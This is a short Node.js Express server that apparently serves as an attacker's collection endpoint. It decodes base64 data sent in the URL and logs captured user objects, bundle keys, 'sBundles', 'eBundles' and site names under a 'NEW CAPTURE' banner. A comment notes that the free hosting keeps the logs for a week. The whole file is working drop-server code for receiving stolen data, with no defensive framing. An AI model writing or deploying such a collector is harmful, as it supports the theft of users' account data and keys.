const express = require('express');
const app = express();

app.get('/data/:encoded', (req, res) => {
  try {
    const decoded = JSON.parse(Buffer.from(req.params.encoded, 'base64').toString('utf-8'));
    console.log('===== NEW CAPTURE =====');
    console.log('User:', JSON.stringify(decoded.user, null, 2));
    console.log('Bundle Key:', decoded.bundle);
    console.log('sBundles:', decoded.sBundles);
    console.log('eBundles:', decoded.eBundles);
    console.log('Site:', decoded.site);
    console.log('========================');
    // Data is logged. Render keeps logs for 7 days free.
  } catch(e) {
    console.log('Invalid data received');
  }
  res.send('ok');
});

app.listen(10000, () => console.log('Collector running on port 10000'));